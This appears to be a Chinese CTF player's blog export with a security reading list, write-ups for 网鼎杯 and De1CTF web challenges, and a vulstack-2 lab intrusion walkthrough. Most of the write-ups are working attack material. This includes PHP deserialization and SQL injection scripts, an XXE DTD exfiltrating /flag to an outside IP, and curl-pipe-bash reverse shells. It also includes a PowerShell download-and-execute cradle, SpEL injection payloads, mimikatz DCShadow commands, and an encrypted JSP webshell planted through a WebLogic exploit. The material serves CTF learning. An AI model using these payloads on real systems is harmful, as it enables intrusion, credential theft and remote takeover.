{"meta":{"title":"glotozz'blog","subtitle":null,"description":null,"author":"glotozz","url":"https://glotozz.github.io","root":"/"},"pages":[{"title":"关于我","date":"2019-09-04T14:16:42.000Z","updated":"2020-03-27T14:47:15.898Z","comments":true,"path":"about/index.html","permalink":"https://glotozz.github.io/about/index.html","excerpt":"","text":"dota2专业中单，nepnep划水web手"},{"title":"文章收集","date":"2019-09-04T14:16:42.000Z","updated":"2020-04-17T11:25:25.355Z","comments":true,"path":"read/index.html","permalink":"https://glotozz.github.io/read/index.html","excerpt":"","text":"4/17 浅谈Fastjson RCE漏洞的绕过史 jenkins 2.101 XStream rce 挖掘思路 Jenkins之Java反序列化漏洞分析（CVE-2016-0792） DefineClass在Java反序列化当中的利用 4/12 21届应届安全学生最值得学习的Github项目 4/9 PHP7.0-PHP7.3新特性和变更汇总 4/3 Time_Based_RCE 高级sql注入 4/2 HTTP参数传递类型差异产生的攻击面 错误使用TP上传类导致getshell 一次“SSRF–&gt;RCE”的艰难利用 4/1 高效漏洞挖掘之Fuzzing的艺术 拿WordPress开刀——点亮代码审计技能树（一） 3/29 代码审计入门之用友畅捷通T+代码审计 3/26 RIPS 2017 PHP代码安全审计挑战 3/25 反序列化之PHP原生类的利用 3/20 GitHub 搜索骚技巧 记一次Redis+Getshell经验分享 shodan自动化利用 3/19 用Powershell框架Empire进行内网域渗透(一) 3/18 30个有关Python的小技巧 metasploit续 内网渗透 3/17 Msfvenom学习总结 Payload实现分离免杀 3/16 requests.get()参数 Linux 反弹shell（二）反弹shell的本质 3/15 实战：爬取网易云音乐歌曲对应id并剔除无版权歌曲 3/14 [小密圈]经典写配置漏洞与几种变形学习 shellcode加载总结 后渗透之meterpreter使用攻略 3/13 Linux下的权限维持 3/12 特殊权限 SUID、SGID、Sticky 我所了解的渗透测试——Linux后门类型 3/11 Linux终极渗透测试命令总结（收藏备用） Linux下常见的权限维持方式 phpinfo中值得注意的信息 ssi注入漏洞 3/10 SSRF漏洞(原理&amp;绕过姿势) 一篇文章带你深入理解漏洞之 XXE 漏洞 OS注入指北 3/5 常见Web源码泄露总结 PHP的几种运行方式 Apache中.htaccess文件利用的总结与新思路拓展 3/4 .htaccess详解及.htaccess参数说明 解析漏洞总结 浅析白盒审计中的字符编码及SQL注入 3/3 strtus2那些事 Struts2著名RCE漏洞引发的十年之思 Xss小游戏通关秘籍 3/2 深入了解序列化writeObject、readObject、readResolve 3/1 Fastjson反序列化漏洞利用分析 fastjson 远程反序列化poc的构造和分析 2/29 Java反序列化漏洞从入门到深入 Spring framework deserialization RCE漏洞分析以及利用 Jndi注入及Spring RCE漏洞分析 2/28 从零开始java代码审计系列(一) Java代码审计入门篇：WebGoat 8 2/27 SVG XSS的一个黑魔法 深入理解浏览器解析机制和XSS向量编码 CSP策略及绕过方法 2020年仍然有效的一些XSS Payload 2/26 LD_PRELOAD+putenv bypass 跨域方式及其产生的安全问题 Python3编码问题 CRLF注入漏洞"}],"posts":[{"title":"网鼎杯-wp","slug":"网鼎杯-wp","date":"2020-05-10T08:29:10.000Z","updated":"2020-05-10T23:05:01.247Z","comments":true,"path":"2020/05/10/网鼎杯-wp/","link":"","permalink":"https://glotozz.github.io/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 web1 web2 web3 web4 我又躺躺了，22名 web1限制了32&lt;=ascii&lt;=125，个人测试php7.2及以上可以将属性类型修改为public 读取flag.php失败，原因是折构函数中的cwd为根目录/，之前[D3CTF 2019]EzUpload遇到过，因此需要绝对路径。 先爆破读取配置文件得到web目录，再读flag即可 1&#x2F;etc&#x2F;apache2&#x2F;httpd.conf 看了Y1ng师傅的wp是先利用cmdline读取配置文件的路径 1&#x2F;proc&#x2F;self&#x2F;cmdline 123456789101112131415&lt;?phpclass FileHandler &#123; public $op; public $filename; function __construct() &#123; //弱类型 $this-&gt;op = 2; $this-&gt;filename = \"/etc/apache2/httpd.conf\"; $this-&gt;filename = \"/web/html/flag.php\"; &#125;&#125;$a = new FileHandler();echo urlencode(serialize($a)); 或者群里看到可以利用misformatted（删去最后的大括号），相对路径读。测了下可行，原理得看源码 经过测试，也是php7.2及以上 还有种方法，在序列化和反序列化的时候可以对转义字符进行处理 Bypass ecshop3.x WAF-ecshop 2.x/3.x无限制getshell 漏洞分析 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $this-&gt;op = 2; $this-&gt;filename = \"/etc/apache2/httpd.conf\"; &#125;&#125;$a = new FileHandler();$b = urlencode(serialize($a));echo $b.\"\\n\";$b = str_replace('%00','\\00',$b);$b = str_replace('%2A','\\2A',$b);$b = urldecode($b);echo $b.\"\\n\";$b = 'O:11:\"FileHandler\":3:&#123;S:5:\"\\00\\2A\\00op\";i:2;S:11:\"\\00\\2A\\00filename\";s:23:\"/etc/apache2/httpd.conf\";S:10:\"\\00\\2A\\00content\";N;&#125;'; //需要手动将私有属性对应的s改成大写function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(is_valid($b))&#123; echo \"ok\"; var_dump(unserialize($b));&#125;else&#123; echo \"sorry\";&#125; web2读取 12345678&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;file_in_java&#x2F;WEB-INF&#x2F;web.xml..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;file_in_java&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;file_in_java&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;file_in_java&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class 发现能上传jsp，得到了上传路径WEB-INF/upload，但是访问shell地址仍然404 审计UploadServlet可疑 https://xz.aliyun.com/t/6996 xxe盲注 [Content_Types].xml 123456&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM \"http://118.178.88.46:1234/test.dtd\"&gt;%remote;%int;%send;]&gt;&lt;Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"&gt;&lt;Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/&gt;&lt;Default Extension=\"xml\" ContentType=\"application/xml\"/&gt;&lt;Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/&gt;&lt;Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/&gt;&lt;Override PartName=\"/xl/theme/theme1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.theme+xml\"/&gt;&lt;Override PartName=\"/xl/styles.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml\"/&gt;&lt;Override PartName=\"/docProps/core.xml\" ContentType=\"application/vnd.openxmlformats-package.core-properties+xml\"/&gt;&lt;Override PartName=\"/docProps/app.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.extended-properties+xml\"/&gt;&lt;/Types&gt; test.dtd 12&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;118.178.88.46:1235?p&#x3D;%file;&#39;&gt;&quot;&gt; web3测试发现是insert into注入，但是插入20行以上提示Error 所以是insert into注入+时间盲注（没回显）+报错（防止插入数据） information_schema被过滤，猜个表名flag+无列名注入 python脚本 123456789101112131415161718192021222324252627282930#!/usr/bin/env python2# coding=utf-8import requestsimport urllibs = requests.session()url = \"http://4adb1115aff04e1ca02ead7c61cc6246205fd9409286474e.changame.ichunqiu.com/register_do.php\"flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(33, 127): param = \"2'^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),&#123;&#125;,1))=&#123;&#125;,pow(999,999) or sleep(3),pow(999,999)),'1')#\".format(str(i), str(j)) data = &#123; 'username': param, 'password': 'bb' &#125; try: r = requests.post(url=url, data=data, timeout=3) # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: flag += chr(j) tmp = 0 print flag breakprint(flag) web4比赛时没搞出来 CVE-2019-10795 undefsafe是一款支持设置值的函数。 undefsafe 2.0.3之前版本中存在安全漏洞。攻击者可借助a函数利用该漏洞添加或修改Object.prototype属性。 https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940 javascript原型链污染，方法可能不唯一，下面的比较明显 污染点/edit_note 123456789let id = req.body.id;let author = req.body.author;let enote = req.body.raw;notes.edit_note(id, author, enote);edit_note(id, author, raw) &#123; undefsafe(this.note_list, id + '.author', author); undefsafe(this.note_list, id + '.raw_note', raw);&#125; 触发点/status，虽然这里看的不是很懂，exec调用/bin/bash，知道commands是{}类型的调用，前面已经将属性复制到object中 123456789101112for (let index in commands) &#123; let commands = &#123; \"script-1\": \"uptime\", \"script-2\": \"free -m\" &#125;; exec(commands[index], &#123;shell:'/bin/bash'&#125;, (err, stdout, stderr) =&gt; &#123; if (err) &#123; return; &#125; console.log(`stdout: $&#123;stdout&#125;`); &#125;);&#125; 参考例子 1234var a = require(\"undefsafe\");var payload = \"__proto__.toString\";a(&#123;&#125;,payload,\"JHU\");console.log(&#123;&#125;.toString); POST访问/edit_note传 1id&#x3D;__proto__.hahhah&amp;author&#x3D;curl http:&#x2F;&#x2F;118.178.88.46:1235&#x2F;rev.txt|bash&amp;raw&#x3D;aa 返回500没关系，再GET访问/status 成功反弹shell","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"De1CTF-wp","slug":"De1CTF-wp","date":"2020-05-03T12:09:56.000Z","updated":"2020-05-10T16:04:14.743Z","comments":true,"path":"2020/05/03/De1CTF-wp/","link":"","permalink":"https://glotozz.github.io/2020/05/03/De1CTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 check in mixture Hard_Pentest_1 Calc bypass the cloud WAF check in1perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents! X-Powered-By: PHP/5.4.16 12AddType application&#x2F;x-httpd-p\\hp .jpg 利用换行绕过，这个姿势其实以前用过，一开始没想起来。。 预期解是利用上传.htaccess启用cgi .htaccess 12Options +ExecCGISetHandler cgi-script solve.sh 12345#!&#x2F;bin&#x2F;bashecho &quot;Content-Type: text&#x2F;plain&quot;echo &quot;&quot;cat &#x2F;flagexit 0 mixture1and case when(FIELD(substr((&#123;&#125;),&#123;&#125;,1),&#39;&#123;&#125;&#39;)&#x3D;1)then(benchmark(100000,sha1(sha(sha(1)))))end; 之后看了源码 1234567891011121314151617181920&lt;?phpinclude \"profile.php\";include \"config.php\";$orderby = $_GET['orderby'];if(!empty($orderby))&#123; $blacklist = \"/if|desc|sleep|rand|updatexml|\\^|union|\\|\\||&amp;&amp;|regexp|exp|extractvalue|length|hex/i\"; if(preg_match($blacklist, $orderby)) exit(\"No~~hacker!\"); $sql = \"SELECT * FROM users order by id \".$orderby; $result = $mysqli-&gt;query($sql); if($result===false)&#123; $sql=\"SELECT * FROM users\"; &#125;&#125;else&#123; $sql = \"SELECT * FROM users\";&#125;$result = $mysqli-&gt;query($sql);?&gt; 一开始以为是 1SELECT * FROM users order by id &quot;$orderby&quot; 测试发现不是，最后只能是SELECT * FROM users order by id $orderby 还过滤了desc，就不太明白这样的查询语句意义是啥。。 Hard_Pentest_1对文件内容进行过滤 12345if(!preg_match(&#39;&#x2F;[a-z0-9;~^&#96;&amp;|]&#x2F;is&#39;,$file_content) &amp;&amp; !in_array($exts, $BlackExts) &amp;&amp; !preg_match(&#39;&#x2F;\\.\\.&#x2F;&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) &#123; return true;&#125; Y1ng师傅的思路 1扫描了一下发现题目是Windows，所以后缀就好办了，直接大小写绕过；getshell就用p神的无字母数字RCE，对于没有分号，也很简单，&lt;? echo &quot;&quot; ?&gt; &lt;? echo &quot;&quot; ?&gt;这样 利用php的闭合标签来绕过即可，因为PHP在单行中是不需要分号的；但是穿上的马用起来还是比较复杂，可以用echo &quot;&lt;?php eval(&#39;aaa&#39;); ?&gt;&quot; &gt;y1ng.php来传个shell，已经传好了： 注意下面两点： eval无法作为变量动态执行 php7.1以后assert不能用，assert() with string argument dynamically 1234567&lt;?&#x3D;$_&#x3D;[]?&gt;&lt;?&#x3D;$_&#x3D;@&quot;$_&quot;?&gt;&lt;?&#x3D;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]?&gt;&lt;?&#x3D;$___&#x3D;$_?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$___.&#x3D;$__?&gt;&lt;?&#x3D;$___.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$___.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$___.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$___.&#x3D;$__?&gt;&lt;?&#x3D;$____&#x3D;&#39;_&#39;?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$____.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$____.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$____.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$____.&#x3D;$__?&gt;&lt;?&#x3D;$_&#x3D;$$____?&gt;&lt;?&#x3D;$_[__]($_[_])?&gt;&#x3D;&gt;$_POST[__]($_POST[_])&#x3D;&gt;__&#x3D;system&amp;_&#x3D;dir__&#x3D;system&amp;_&#x3D;echo &quot;&lt;?php eval($_POST[a]); ?&gt;&quot; &gt; a.php wuzimu.php_ ==============msf 这里生成的时候x64注意不能选择64位，64会失败 域信息收集 123net user &#x2F;domainipconfig &#x2F;all... 1net view \\\\192.168.0.12 得到压缩包 因为权限较低，常规的提取密码工具都获取失败，使用getgpppassword 1shell powershell.exe -nop -c &quot;IEX ((new-Object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;118.178.88.46:1237&#x2F;Get-GPPPassword.ps1&#39;));Get-GPPPassword -Server De1CTF2020.lab&quot; 或者使用msf的gpp模块 1msf &gt; use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp 提示 1234Get flag2 Hint: hint1: You need De1ta user to get flag2 hint2: De1ta user&#39;s password length is 1-8, and the password is composed of [0-9a-f]. hint3: Pay attention to the extended rights of De1ta user on the domain. hint4: flag2 in Domain Controller (C:\\Users\\Administrator\\Desktop\\flag.txt) 第二关生成符合要求的密码 1234root@kali:~&#x2F;Desktop&#x2F;crunch# crunch 1 8 0123456789abcdef -o pass.txtCrunch will now generate the following amount of data: 40926266144 bytes39030 MB38 GB 使用smb_login模块爆破 先代理转发cs的socks4+proxychains 123456use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_loginset rhosts 192.168.0.11set user_file &#x2F;root&#x2F;Desktop&#x2F;crunch&#x2F;user.txtset pass_file &#x2F;root&#x2F;Desktop&#x2F;crunch&#x2F;pass.txtset stop_on_success trueexploit =================当然上面肯定是爆破不出来的 Nu1L的wp 我们要去通过类似爆破的⼿法获取De1ta账户的权 限，通过Kerberoast，爆破获取到密码，然后根据Hint获取了De1ta的ExtendRights，通过搜索发现 ExtenRights符合Dcshadow的利⽤条件。 这个利⽤需要使⽤De1ta⽤户和System权限，De1ta有DM机器的Genric Write权限，利⽤资源委派本地提权。 然后在System beacon下执⾏（make token后）： mimikatz !lsadump::dcshadow /object:De1ta /attribute:primaryGroupID /value:514 mimikatz @lsadump::dcshadow /push 即可修改De1ta⽤户的primaryGroupID属性，将其变为域管理员，随后直接使⽤这个账户通过smb打 dc即可。 第一步，找了篇文章：技术讨论 | 一次详细的Kerberoast攻击演示 攻击者通常会选择那些可能设置了弱密，码破解成功率较高的票据来尝试破解。 Calc根据url猜测是spel注入， 提示hacker,参考 https://xi4or0uji.github.io/2019/03/20/code-breaking-easy/#Javacon 当时的payload，利用反射 1T(String).getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;ex&#39;+&#39;ec&#39;,T(String[])).invoke(T(String).getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;getRu&#39;+&#39;ntime&#39;).invoke(T(String).getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;)), new String[]&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;curl http:&#x2F;&#x2F;abcdef.ceye.io&#x2F;&#96;cd &#x2F; &amp;&amp; ls|base64|tr \\&quot;\\n\\&quot; \\&quot;-\\&quot;&#96;&#39;&#125;) fuzz得到黑名单 123456java.+lang,Runtime,exec.*\\(StringgetClassT(new# https://aluvion.github.io/2019/04/25/Java%E7%89%B9%E8%89%B2-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/ 12345#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15].invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7].invoke(null),&#39;curl 172.17.0.1:9898&#39;) 这里使用第三种，可以将一些关键字用字符串拼接的方式绕过，但是命令执行不成功，考虑文件读取 1&#39;&#39;.class.forName(&#39;java.nio.file.Files&#39;).getDeclaredMethods()[17].invoke(null,&#39;&#39;.class.forName(&#39;java.nio.file.Paths&#39;).getDeclaredMethods()[0].invoke(null,&#39;&#x2F;flag&#39;,&#39;&#39;.class.forName(&#39;jav&#39;+&#39;a.lang.&#39;+&#39;Str&#39;+&#39;ing&#39;).getDeclaredMethods()[63].invoke(&#39;&#39;,&#39;a&#39;))) 还可以使用NEW，大写绕过 1NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File(&#39;&#x2F;flag&#39;)))).nextLine() Nu1L的payload，利用\\x00 1&#39;calc&#39;:&#39;T\\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass(&quot;java.nio.file.Files&quot;).readAllLines(T\\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass(&quot;java.nio.file.Paths&quot;).get(&quot;&#x2F;flag&quot;))&#39; ==========================抄下wp bypass the cloud WAF [https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/Animal%20Crossing](https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/Animal Crossing) 云waf 123456789101112var blackList &#x3D; []string&#123; &#x2F;&#x2F;global &quot;document&quot;, &quot;window&quot;, &quot;top&quot;, &quot;parent&quot;, &quot;global&quot;, &quot;this&quot;, &#x2F;&#x2F;func &quot;console&quot;, &quot;alert&quot;, &quot;log&quot;, &quot;promise&quot;, &quot;fetch&quot;, &quot;eval&quot;, &quot;import&quot;, &#x2F;&#x2F;char &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;&#96;&quot;, &quot;\\\\*&quot;, &quot;&amp;&quot;, &quot;#&quot;, &quot;%&quot;, &quot;\\\\\\\\&quot;, &#x2F;&#x2F;key &quot;if&quot;, &quot;set&quot;, &quot;get&quot;, &quot;with&quot;, &quot;yield&quot;, &quot;async&quot;, &quot;wait&quot;, &quot;func&quot;, &quot;for&quot;, &quot;error&quot;, &quot;string&quot;, &#x2F;&#x2F;string &quot;href&quot;, &quot;location&quot;, &quot;url&quot;, &quot;cookie&quot;, &quot;src&quot;,&#125; 绕过黑名单的方法是避免使用禁令中的字符串和字符。在这里，由于go的iris框架问题，;以及之后的数据将被删除，并可以通过%0a 主要是学习绕过waf的思路 1234567891. Pass in data to fmt.Sprintf(&quot;&#39;%s&#39;;&quot;, data), and then parse the syntax. If parse fails, the error will be returned directly.2. And then we visit AST nodes: 1. VariableExpression&#x2F;AssignExpression, All declaration&#x2F;assignment statements will ban 2. CallExpression, all function call, and callee not Identifier, will ban, example: 1. ban: test.test()、a[x]() 2. pass: test() 3. BracketExpression, all member reference and member is not Identifier, will ban, example: 1. ban: a[1]、a[&#39;xx&#39;] 2. pass: a[x] 然后是fuzz，最终payload 1data&#x3D;base64DATAXXXXXXX&#39;%0atry&#123;throw &#39;ev&#39;%2b&#39;al&#39;&#125;catch(e)&#123;try&#123;throw frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a&#x2F;&#x2F;","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"vulstack-2","slug":"vulstack-2","date":"2020-05-02T11:22:22.000Z","updated":"2020-05-06T04:30:47.268Z","comments":true,"path":"2020/05/02/vulstack-2/","link":"","permalink":"https://glotozz.github.io/2020/05/02/vulstack-2/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、环境搭建 二、信息收集 三、getshell 四、免杀+上线 五、信息收集 六、横向渗透 七、内网漏洞 一、环境搭建DC IP：10.10.10.10 OS：Windows 2012(64) 应用：AD域 WEB IP1：10.10.10.80 IP2：192.168.48.129 OS：Windows 2008(64) 应用：Weblogic 10.3.6 MSSQL 2008 手动启动 1C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\bin\\startWebLogic PC IP1：10.10.10.201 IP2：192.168.48.130 OS：Windows 7(32) 二、信息收集1nmap -sS -sV -T4 -A -p- 192.168.48.129 虽然ping不通，但是nmap能无ping扫描 三、getshell存在weblogic服务，访问http://192.168.48.129:7001/console 使用weblogicscan扫描， poc：https://github.com/TopScrew/CVE-2019-2725 1python weblogic-2019-2725.py 10.3.6 http:&#x2F;&#x2F;192.168.48.129:7001 上传了demo.php，路径为./servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/demo.jsp，修改上传的源码或者命令执行写入文件 echo的内容中中存在&gt;等特殊字符需要使用^转义，使用echo xx&gt;aa默认这样会在文件结尾多个换行，使用set/p=xxxx&lt;nul&gt;aa.txt 1python weblogic-2019-2725.py 10.3.6 http:&#x2F;&#x2F;192.168.48.129:7001 &quot;set&#x2F;p&#x3D;^&lt;%@page import&#x3D;\\&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*\\&quot;%^&gt;^&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%^&gt;^&lt;%if(request.getParameter(\\&quot;pass\\&quot;)!&#x3D;null)&#123;String k&#x3D;(\\&quot;\\&quot;+UUID.randomUUID()).replace(\\&quot;-\\&quot;,\\&quot;\\&quot;).substring(16);session.putValue(\\&quot;u\\&quot;,k);out.print(k);return;&#125;Cipher c&#x3D;Cipher.getInstance(\\&quot;AES\\&quot;);c.init(2,new SecretKeySpec((session.getValue(\\&quot;u\\&quot;)+\\&quot;\\&quot;).getBytes(),\\&quot;AES\\&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%^&gt;&lt;nul&gt;.&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;shell.jsp&quot; 四、免杀+上线弹个cs，因为存在360，需要对exe进行免杀处理 